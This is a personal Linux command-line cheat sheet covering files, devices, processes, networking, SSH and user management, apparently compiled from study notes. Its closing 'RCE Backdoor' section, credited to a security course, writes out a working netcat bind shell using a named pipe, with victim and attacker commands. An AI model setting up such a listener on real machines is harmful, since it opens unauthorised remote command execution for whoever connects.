# About
These are commands that one may find useful on Linux workstations and servers. While there are a variety of shells or command-line interpreters (CLI) available that offer their own flavor to available commands, and Linux distributions which may file commands and configuration files in different locations, these should generally work across all of them. For the purpose of this documentation, validation has been done against Ubuntu and CentOS using the Bash CLI.

Any text after a # in an example is a remark or comment, which explains what the command does.

# Filesystem operations

## Directories
Note that Linux uses forward slashes instead of DOS/Windows' backslash to separate directories or folders and their filenames in a path.
e.g.:
> Windows: C:\Users\username\
> Linux/Mac: /home/username/

### Change Directory
```sh
cd           # Change Directory
cd ~         # Go to current user's home directory (alias)
cd /usr/bin  # Change to binary or applications folder (like Program Files for Linux)
cd ..        # Go to the current directory's parent directory
```

### Create / delete director
```sh
mkdir {foldername}  # Create directory
rmdir {foldername}  # Remove directory
```

### Print working directory
Where the heck am I?!
```sh
pwd           # Print Working Director
```

### List Files
Like the DOS *DIR* command
```sh
ls            # Lists files across the screen, wide format
ls -a         # Lists all files, including hidden "dot" files; e.g.: .bashrc
ls -l         # Shows files in a list format
ls -al        # Shows all files in list format
lsof          # Lists all open files
              # Run with '-p PID' of running exe to get associated files
              # Run with '-u {username}' to list files open by user+
              # Run as 'lsof -i' to get processes with open inet sockets
```

## File operations
```sh
# View
cat           # Dumps file contents to screen
cat | less    # Paginates the output of cat: press ⬆/⬇ to move by line, spacebar = page
strings       # Human readable information about a executable/binary file's contents
tail {file}   # Display last several lines of a file or log, add '-n #' to specify qty

# Find
command | grep # Grep is like findstr, search results for a value: grep "text here"
grep "string" filename    # Search for a string within a file or object
grep -Ri "string" /path/  # Case-insensitive search of all files in path for "string"
pwd | grep -Ri "$1" 2>/dev/null # Search all files in current working directory

# Edit
touch {file}  # Create an empty file with a given filename
nano {file}   # Text editor: Ctl-O to save, Ctl-X to exit, menu at bottom
vi/vim {file} # Multimode text editor: starts in navigate mode
              # Edit: a or i to enter edit mode, esc to exit edit mode
              # Nav: / to search for text, gg to go home, G end
              #      :wq to save, :q! to quit without save
```

## Devices and drives
```sh
# Partitions
mount /dev/sda1/ /mnt/c  # Mounts drive sda, partition 1, to the local /mnt/c folder
                         # User may need to 'mkdir /mnt/c' first or receive an error
umount /mnt/c            # Unmount the C drive
nano /etc/fstab          # Add mount point to permanent mounts list

# Loopback devices / images
lsblk          # List block devices (drives)
lsblk -e 7     # List block devices without loopback devices (snaps, images)
losetup -l     # List loop devices and what image is mapped to them

# Make a loopback file
losetup -f                          # Identify next available loopback device
                                    # ...we'll use #17 for the example
touch filename                      # Create a file
fallocate -l 100M filename          # Make the empty file 100 MB large
sudo losetup /dev/loop17 filename   # Create loop number 17 with filename
mkfs.ext4 /dev/loop17               # Create a filesystem within the loop device
mount /dev/loop17 /mnt/loop         # Mount the new loopback filesystem to /mnt/loop

# Connected devices
ls /dev/serial/by-id                # Get list of connected USB devices by name

# System Info
dmidecode                           # Get system information from BIOS
dmidecode -t 16,17                  # Memory info: Max, DIMMS installed in each slot
dmidecode -t memory
dmidecode -t 4                      # Get CPU info
dmidecode -t processor    
```
# System functions

## Run a command
```sh
{command}          # Run any command in the $PATH, like /usr/bin, /usr/sbin
./{command}        # Run a command in the current director
whereis {command}  # Where is a application located
sudo {command}     # Run a command with elevated privileges
sudo !!            # Oops! Rerun the last command, but with elevated privileges
```

## Operations
```sh
0 - input  / stdin
1 - output / stdout
2 - error  / stderr

command < text.txt  # Run command with input from text file
command > text.out  # Output command results to text file, like a log
command &>1         # Output to 0-stdin, 1-stdout, 2-stderr (standard input/output/err)
command 2>/dev/null # Suppress errors, send them to oblivion (null)
command; command    # Run a command, and then another command
command && command  # Run a command, and only if it succeeds run the next command
command | command   # Send output of the first command into the next command
                    # fortune | espeak would speak the text from fortune!

/bin/bash 0<input.txt | less # Advanced example
                    # Run bash with input from backpipe, and route results to netcat
                    # Paginate the output with 'less', try also grep

tee                 # Sends output to both stdout and to a file at the same time
echo "text" | tee output.txt          # Standard use
echo "text" | tee file1 file2         # Write to multiple files
echo "more text" | tee -a output.txt  # Append to existing file
```

## Process List
```sh
ps                    # Snapshot of processes and their process id for current user
ps aux                # Lists all processes running for all users and system services
ps aux | grep Chrome  # Grep / filter for specific processes
ps -u  {username}     # Shows processes owned by a user
top                   # Command Line Task Manager, shows resource utilization
htop                  # More human-readable version, may not be installed
```

## Kill
```sh
kill {process name or pid}
kill -9 {process}
killall {process}
killall -u {username}
xkill
```

## What is the current shell?
```sh
which $SHELL
```

## Aliases
Most shells allow aliases, or shortcuts for longer commands or strings of commands.
```sh
alias                        # Lists all defined aliases
alias ls='exa --color=auto'  # ls command remapped to exa w/ color
```

# Network operations

## What is my LAN IP
```sh
hostname     # Show just hostname
hostname -I  # Show IP address
ip addr      # Modern "ipconfig" for Linux
ifconfig     # Legacy "ipconfig"
```

## What is my WAN IP
```sh
alias wanip="curl https://wtfismyip.com/text"
```

## Domain Name Lookup and DNS Records
```sh
dig google.com MX  # Get MX Records for a domain
                   # add '+short' to any dig command to simplify the output
nslookup           # Get IP address of a domain or reverse (PTR) record of an IP
```

## Who owns an IP or Domain?
```sh
whois 172.58.219.231 | grep Organization
```

## Where is an IP from?
```Shell
geoip-lookup {IP} # from geoip-bin deb package
cat ips.txt | xargs -t -L 1 geoiplookup  # Get geolocation for a list of IPs
```

## Who is on the network, are they reachable?
```sh
ping {ipaddr}                             # See if remote system is reachable
sudo hping3 {ipaddr} --icmp --icmp-ts -V  # Get pings with remote system timestamps
route                                     # Get and set network routes via gateway IPs
arp {-a}                                  # List local IPs your system has seen

# Combine ping to broadcast IP with arp to identify who is on the network now
ping 192.168.1.255  # User broadcast IP appropriate for LAN subnet
^C                  # Kill process after 30 seconds or so
arp -a
```
## Scan network with nmap
```sh
nc -zw3 ipaddress_or_dns 443 && echo "opened" || echo "closed"
nmap -p {ports,comma-delimeted} {ipaddr} | grep open
```

## SSH: Remote Command Line and Proxy Service
```sh
ssh {address}                                # Connect to remote server's command line
ssh {user}@{address}                         # Include username, will only ask password
ssh {user}@{address} -p {port}               # Specify a non-standard SSH port
ssh {user}@{address} {command}               # Run a command on the remote PC and exit
ssh {user}@{address} '{string of commands}'  # Run several commands or piped commands
ssh -L local_port:remote_address:remote_port username@server.com  # Proxy WAN > LAN
e.g.: ssh -L 4433:192.168.1.1:443 user@ssh-server.com             # Remote LAN firewall
```
Accidentally hitting `control` + `s` causes the session to *stop* or freeze.
To disconnect a locked-up ssh session, type ` Enter ` ` ~ ` ` . ` one at a time.

# User Functions

## Who am I?
Current session's username
```sh
whoami  # Simply provides username of signed-in user
id      # Gets username, uid, and group memberships
```

## Who is signed in?
List all users signed into the system
```sh
who  # Lists sign-on date, time, load, and current console application
w    # Lists sign-on date and IP or source of connection
```

## Change password
Add username to change another's password, or omit to change current user's password.
```sh
passwd             # Chamge current user's password
passwd {username}  # Change another user's password
```

## Switch user
The command prompt will end with $ for standard user sessions, # for root administrator sessions.
```sh
su {username}   # Switch to user, if username not included it switches to root
su -            # Switch user, but carry over environment variables
```

## List users and groups
```sh
# Users
useradd -G group user   # Create a user and assign them to a group

cat /etc/passwd         # List all users, system and end user, including home folder and shell
cut -d: -f1 /etc/passwd # Cut all but the first 'word'; displays just usernames

compgen -u              # List users
compgen -u | column     # List users in a column format

# Groups
groups                  # Lists just group names
groups username         # Shows groups a user is assigned to
cat /etc/group          # Show list of groups and their members

groupadd mynewgroup     # Create a grup
usermod -a -g group usr # Add group to user, this is now their primary group
usermod -a -G group usr # Add group to user, this is a secondary group

'group' is comma delimited; e.g.: sermod -a -G group1,group2 usr
```

# TUI
```sh
whiptail   # Create a dialog box
```

# Advanced
## RCE Backdoor
From AntiSyphon course
```sh
# Victim
mknod backpipe p  # Create block or character device special files, -p FIFO
/bin/bash 0<backpipe | nc -l 2222 1>backpipe # Listen on port 2222, route to backpipe file and run contents of backpipe file in bash

# Attacker
nc {hostname/ip} {port e.g. 2222}  # Connect to remote port for RCE
{commands}
```

# Resources
- https://www.explainshell.com/ - Identifies the parts of a complex command string
- ss64.com - Command lookup for numerous languages
- cheat.sh/command - Use curl to get simplified man pages for commands